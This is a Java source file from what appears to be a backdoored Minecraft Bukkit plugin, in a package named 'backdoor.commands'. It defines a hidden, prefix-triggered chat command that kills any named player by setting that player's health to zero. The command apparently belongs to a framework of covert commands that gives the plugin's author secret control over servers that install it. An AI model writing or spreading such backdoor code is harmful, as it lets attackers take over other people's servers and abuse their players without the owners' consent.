package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "kill",
        usage = {"<prefix> <command> <player>"},
        description = "Kills the specified player",
        aliases = {"kill"})
public class KillCommand extends Command {

    public KillCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getPlayer(args.get(0));
            target.setHealth(0);
        }
    }
}
